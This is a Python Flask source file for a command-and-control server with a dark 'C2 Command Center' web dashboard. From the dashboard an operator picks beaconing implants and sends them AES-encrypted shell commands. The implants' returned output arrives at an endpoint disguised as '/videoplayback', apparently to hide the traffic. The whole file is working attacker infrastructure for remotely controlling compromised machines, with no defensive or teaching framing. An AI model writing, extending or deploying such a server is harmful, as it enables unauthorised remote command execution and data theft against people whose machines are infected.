from flask import Flask, request, render_template_string, redirect, url_for, jsonify
from Crypto.Cipher import AES
import base64
import hashlib
import time

app = Flask(__name__)

SECRET_PHRASE = b"XXXXXXX"
KEY = hashlib.sha256(SECRET_PHRASE).digest()
IV = b"\xXX" * 16

def encrypt(plaintext):
    cipher = AES.new(KEY, AES.MODE_CFB, IV)
    return base64.b64encode(cipher.encrypt(plaintext.encode('utf-8'))).decode('utf-8')

def decrypt(ciphertext):
    try:
        ciphertext = ciphertext.replace(" ", "+")
        cipher = AES.new(KEY, AES.MODE_CFB, IV)
        decoded_bytes = cipher.decrypt(base64.b64decode(ciphertext))
        return decoded_bytes.decode('utf-8', errors='replace')
    except Exception as e:
        return f"[Decryption Error] {str(e)}"

tasks = {}       
outputs = {}     
beacons = {}     

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>C2 Command Center</title>
    <style>
        :root { --bg: #0d0d0d; --panel: #1a1a1a; --text: #e0e0e0; --accent: #00ff41; --danger: #ff4444; --cmd-bg: #000; }
        body { font-family: 'Consolas', 'Monaco', monospace; background-color: var(--bg); color: var(--text); margin: 0; display: flex; height: 100vh; overflow: hidden; }
        
        /* Sidebar */
        .sidebar { width: 280px; background-color: var(--panel); border-right: 1px solid #333; display: flex; flex-direction: column; }
        .sidebar-header { padding: 20px; border-bottom: 1px solid #333; color: var(--accent); font-weight: bold; letter-spacing: 1px; }
        .agent-list { flex: 1; overflow-y: auto; padding: 10px; }
        
        .agent-card { background: #252525; padding: 12px; margin-bottom: 8px; border-radius: 4px; border-left: 3px solid #555; cursor: pointer; transition: 0.2s; }
        .agent-card:hover { background: #333; }
        .agent-card.active { border-left-color: var(--accent); background: #2a2a2a; box-shadow: 0 0 10px rgba(0,255,65,0.1); }
        .agent-id { font-weight: bold; font-size: 13px; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .agent-meta { font-size: 11px; color: #888; margin-top: 4px; display: flex; justify-content: space-between; }
        .status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
        
        /* Main Content */
        .main { flex: 1; display: flex; flex-direction: column; padding: 0; background: var(--bg); }
        .top-bar { padding: 15px 20px; background: var(--panel); border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
        .top-bar h3 { margin: 0; font-size: 16px; color: var(--accent); }
        
        /* Terminal Area */
        .console-wrapper { flex: 1; position: relative; padding: 20px; overflow: hidden; display: flex; flex-direction: column; }
        .console { flex: 1; background: var(--cmd-bg); border: 1px solid #333; border-radius: 4px; padding: 15px; overflow-y: auto; color: #ccc; font-size: 14px; white-space: pre-wrap; font-family: 'Consolas', monospace; box-shadow: inset 0 0 20px #000; }
        
        /* Input Area */
        .input-area { margin-top: 15px; display: flex; gap: 0; border: 1px solid #444; border-radius: 4px; overflow: hidden; }
        .prompt-label { background: #333; color: var(--accent); padding: 12px 15px; font-weight: bold; display: flex; align-items: center; }
        input[type="text"] { flex: 1; background: #1a1a1a; border: none; color: #fff; padding: 12px; font-family: inherit; font-size: 14px; outline: none; }
        input[type="text"]:focus { background: #222; }
        button { background: var(--accent); color: #000; border: none; padding: 0 25px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 12px; letter-spacing: 1px; transition: 0.2s; }
        button:hover { background: #00cc33; }
        
        /* Scrollbar */
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #111; }
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #555; }
    </style>
</head>
<body>

    <div class="sidebar">
        <div class="sidebar-header">C2 CONTROL PANEL</div>
        <div class="agent-list">
            {% for agent in agents %}
            <a href="{{ url_for('select_agent', aid=agent.id) }}" style="text-decoration:none;">
                <div class="agent-card {% if selected_id == agent.id %}active{% endif %}">
                    <div class="agent-id">
                        <span class="status-dot" style="background: {% if agent.is_online %}var(--accent){% else %}var(--danger){% endif %};"></span>
                        {{ agent.id }}
                    </div>
                    <div class="agent-meta">
                        <span>Last seen: {{ agent.last_seen }}s ago</span>
                    </div>
                </div>
            </a>
            {% endfor %}
        </div>
    </div>

    <div class="main">
        {% if selected_id %}
            <div class="top-bar">
                <h3>INTERACTING WITH: {{ selected_id }}</h3>
                <a href="/" style="font-size:12px; color:#666; text-decoration:none; border:1px solid #444; padding:5px 10px; border-radius:3px;">Close Session</a>
            </div>

            <div class="console-wrapper">
                <div class="console" id="consoleOutput">Loading output...</div>

                <form id="cmdForm" class="input-area">
                    <div class="prompt-label">CMD ></div>
                    <input type="text" id="cmdInput" name="cmd" placeholder="Execute command..." autocomplete="off" autofocus>
                    <button type="submit">Send</button>
                </form>
            </div>
        {% else %}
            <div style="display:flex; flex:1; justify-content:center; align-items:center; color:#444; flex-direction:column;">
                <h1 style="font-size:40px; margin:0;">waiting for connection...</h1>
                <p>Select an implant from the sidebar to begin.</p>
            </div>
        {% endif %}
    </div>

    <script>
        const agentId = "{{ selected_id }}";
        const consoleDiv = document.getElementById("consoleOutput");
        let currentOutput = "";

        // Function để cuộn xuống cuối terminal
        function scrollToBottom() {
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
        }

        // --- AJAX POLLING (AUTO UPDATE) ---
        // Hàm này sẽ chạy mỗi 2 giây để check output mới
        function pollData() {
            if (!agentId || agentId === "None") return;

            fetch('/api/poll/' + agentId)
                .then(response => response.json())
                .then(data => {
                    // Nếu nội dung thay đổi thì mới cập nhật DOM để tránh giật lag
                    if (data.output !== currentOutput) {
                        currentOutput = data.output;
                        consoleDiv.innerText = currentOutput || "[!] Ready. Waiting for commands...";
                        scrollToBottom();
                    }
                    
                    // Có thể update thêm trạng thái last_seen ở sidebar nếu muốn (nâng cao)
                })
                .catch(err => console.error("Poll error:", err));
        }

        // --- GỬI LỆNH BẰNG AJAX (Không load lại trang) ---
        const cmdForm = document.getElementById("cmdForm");
        if (cmdForm) {
            cmdForm.addEventListener("submit", function(e) {
                e.preventDefault(); // Chặn load lại trang
                const input = document.getElementById("cmdInput");
                const cmd = input.value;
                if (!cmd) return;

                // Gửi lệnh
                fetch('/send_api/' + agentId, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: 'cmd=' + encodeURIComponent(cmd)
                }).then(() => {
                    input.value = ""; // Xóa ô nhập
                    // Thêm dòng thông báo ảo vào terminal để biết đã gửi
                    currentOutput += "\\n[*] Command sent: " + cmd + "... waiting for beacon...\\n";
                    consoleDiv.innerText = currentOutput;
                    scrollToBottom();
                });
            });
        }

        // Chạy polling ngay lập tức và lặp lại mỗi 2 giây
        if (agentId && agentId !== "None") {
            pollData();
            setInterval(pollData, 2000); 
        }
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_dashboard(None)

@app.route("/agent/<aid>")
def select_agent(aid):
    return render_dashboard(aid)

def render_dashboard(selected_id):
    now = time.time()
    agent_list = []
    sorted_agents = sorted(beacons.items(), key=lambda x: x[1], reverse=True)
    
    for aid, last_time in sorted_agents:
        diff = int(now - last_time)
        agent_list.append({
            "id": aid,
            "last_seen": diff,
            "is_online": diff < 30
        })
    
    return render_template_string(HTML_TEMPLATE, agents=agent_list, selected_id=selected_id)

@app.route("/api/poll/<aid>")
def api_poll(aid):
    out_content = ""
    if aid in outputs:
        out_content = decrypt(outputs[aid])
    return jsonify({"output": out_content})

@app.route("/send_api/<aid>", methods=["POST"])
def send_cmd_api(aid):
    cmd = request.form.get("cmd")
    if cmd:
        tasks[aid] = cmd
        if aid in outputs:
            del outputs[aid] 
    return "OK", 200

@app.route("/get_command")
def get_command():
    aid = request.args.get("id")
    if not aid: return "", 400
    beacons[aid] = time.time()
    if aid in tasks:
        cmd = tasks.pop(aid)
        print(f"send cmd: {aid}: {cmd}")
        return encrypt(cmd), 200
    return "", 200

@app.route("/videoplayback")
def receive_output():
    aid = request.args.get("id")
    chunk = request.args.get("data", "")
    if not aid or not chunk: return "", 400
    
    if aid not in outputs: outputs[aid] = ""
    outputs[aid] += chunk
    beacons[aid] = time.time()
    return "OK", 200

if __name__ == "__main__":
    print("C2 Server run <(')")
    app.run(host="0.0.0.0", port=80, debug=True)
